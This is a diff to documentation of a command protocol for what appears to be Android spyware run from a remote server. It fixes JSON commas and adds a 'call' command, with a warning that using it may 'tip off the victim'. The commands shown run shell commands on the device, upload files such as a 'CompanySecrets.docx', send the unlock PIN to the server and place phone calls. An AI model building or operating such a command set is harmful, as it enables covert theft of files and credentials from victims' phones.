@@ -98,7 +98,7 @@ The `execute` command allows the server to execute a shell command on the device
 ```
 {
     "command": "execute",
-    "nonce": "1234-5467-4353-6468"
+    "nonce": "1234-5467-4353-6468",
     "arguments": {
         "shell_command": "whoami"
     }
@@ -111,7 +111,7 @@ is idle and connected to an unmetered network.
 ```
 {
     "command": "upload",
-    "nonce": "1234-5467-4353-1359"
+    "nonce": "1234-5467-4353-1359",
     "arguments": {
         "filename": "/sdcard/Documents/CompanySecrets.docx"
     }
@@ -123,10 +123,24 @@ The `pin` command sends the device's unlock PIN to the server.
 ```
 {
     "command": "pin",
-    "nonce": "1234-5467-4353-1234"
+    "nonce": "1234-5467-4353-1234",
     "arguments": {}
 }
 ```
+
+#####Call
+The `call` command instructs the phone to call a particular number.
+Use this with care, you may tip off the victim.
+```
+{
+    "command": "call",
+    "nonce": "1234-3948-1230-1241",
+    "arguments": {
+        "phone_number": "1954321234"
+    }
+}
+```
+
 
 #####Reply
 Sometimes, the output of a command is useful.
